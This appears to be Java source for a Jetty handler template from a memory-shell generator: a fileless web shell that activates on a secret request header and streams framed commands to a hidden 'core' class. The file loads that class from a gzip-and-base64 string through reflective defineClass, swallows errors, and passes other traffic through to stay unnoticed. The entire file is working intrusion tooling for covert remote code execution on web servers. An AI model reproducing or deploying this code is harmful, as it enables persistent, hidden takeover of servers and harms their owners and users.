package org.leo.jmg.mem.shell.http;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.util.zip.GZIPInputStream;

/** Jetty 7-11 Handler 的 HTTP Chunk 协议模板。 */
public class LeoJettyHandlerChunkTpl {
    private static String headerName;
    private static String headerValue;
    private static String coreClassName;
    private static String coreClass;
    private static int respCode;
    private Object nextHandler;

    public boolean handleRequest(Object request, Object response) {
        try {
            Object header = invoke(request, "getHeader",
                    new Class[]{String.class}, new Object[]{headerName});
            if (header == null || !String.valueOf(header).contains(headerValue)) return false;

            invoke(response, "setStatus", new Class[]{Integer.TYPE},
                    new Object[]{Integer.valueOf(respCode)});
            optionalInvoke(response, "setHeader", new Class[]{String.class, String.class},
                    new Object[]{"X-Accel-Buffering", "no"});
            optionalInvoke(response, "setHeader", new Class[]{String.class, String.class},
                    new Object[]{"Connection", "keep-alive"});
            optionalInvoke(response, "setContentType", new Class[]{String.class},
                    new Object[]{"application/octet-stream"});
            optionalInvoke(response, "setBufferSize", new Class[]{Integer.TYPE},
                    new Object[]{Integer.valueOf(8192)});

            InputStream input = (InputStream) invoke(request, "getInputStream",
                    new Class[0], new Object[0]);
            OutputStream output = (OutputStream) invoke(response, "getOutputStream",
                    new Class[0], new Object[0]);
            DataInputStream dataInput = new DataInputStream(input);
            DataOutputStream dataOutput = new DataOutputStream(output);
            Class core = loadCore();
            dataOutput.flush();
            while (true) {
                int frameType = dataInput.readUnsignedByte();
                long transportId = dataInput.readLong();
                int length = dataInput.readInt();
                if (length < 0 || length > 16777216) break;
                byte[] data = new byte[length];
                dataInput.readFully(data);
                if (frameType == 4) break;
                if (frameType == 3) continue;
                int responseType;
                byte[] responseData;
                if (frameType == 2 && length == 0) {
                    responseType = 3;
                    responseData = new byte[0];
                } else if (frameType == 1) {
                    responseType = 1;
                    ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                    buffer.write(data);
                    try {
                        ((java.lang.reflect.InvocationHandler) core.newInstance()).invoke(null, null, new Object[]{buffer});
                    } catch (Throwable e) {
                        throw new IllegalStateException("Core invocation failed", e);
                    }
                    responseData = buffer.toByteArray();
                } else {
                    break;
                }
                if (responseData.length > 16777216) break;
                dataOutput.writeByte(responseType);
                dataOutput.writeLong(transportId);
                dataOutput.writeInt(responseData.length);
                dataOutput.write(responseData);
                dataOutput.flush();
            }
            return true;
        } catch (Throwable ignored) {
            return false;
        }
    }

    public void markHandled(Object baseRequest) {
        try {
            invokeCompatible(baseRequest, "setHandled", new Object[]{Boolean.TRUE});
        } catch (Throwable ignored) {
        }
    }

    public void forward(Object[] arguments) {
        if (nextHandler == null) return;
        try {
            invokeCompatible(nextHandler, "handle", arguments);
        } catch (Throwable ignored) {
        }
    }

    @SuppressWarnings("all")
    private Class loadCore() throws Exception {
        ClassLoader loader = getClass().getClassLoader();
        try {
            return Class.forName(coreClassName, true, loader);
        } catch (ClassNotFoundException ignored) {
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            GZIPInputStream gzip = new GZIPInputStream(
                    new ByteArrayInputStream(base64Decode(coreClass)));
            byte[] block = new byte[4096];
            int read;
            while ((read = gzip.read(block)) != -1) output.write(block, 0, read);
            gzip.close();
            byte[] bytes = output.toByteArray();
            Method defineClass = ClassLoader.class.getDeclaredMethod(
                    "defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);
            return (Class) defineClass.invoke(loader, bytes,
                    Integer.valueOf(0), Integer.valueOf(bytes.length));
        }
    }

    private static Object invoke(Object target, String name,
                                 Class[] parameterTypes, Object[] arguments) throws Exception {
        Method method = target.getClass().getMethod(name, parameterTypes);
        method.setAccessible(true);
        return method.invoke(target, arguments);
    }

    private static void optionalInvoke(Object target, String name,
                                       Class[] parameterTypes, Object[] arguments) {
        try {
            invoke(target, name, parameterTypes, arguments);
        } catch (Throwable ignored) {
        }
    }

    private static Object invokeCompatible(Object target, String name,
                                           Object[] arguments) throws Exception {
        Class type = target.getClass();
        while (type != null) {
            Method[] methods = type.getDeclaredMethods();
            for (int i = 0; i < methods.length; i++) {
                Method method = methods[i];
                if (!method.getName().equals(name)
                        || method.getParameterTypes().length != arguments.length) continue;
                method.setAccessible(true);
                return method.invoke(target, arguments);
            }
            type = type.getSuperclass();
        }
        throw new NoSuchMethodException(name);
    }

    @SuppressWarnings("all")
    private static byte[] base64Decode(String value) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64")
                    .getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class)
                    .invoke(decoder, value);
        } catch (Exception ignored) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class)
                    .invoke(decoder, value);
        }
    }
}
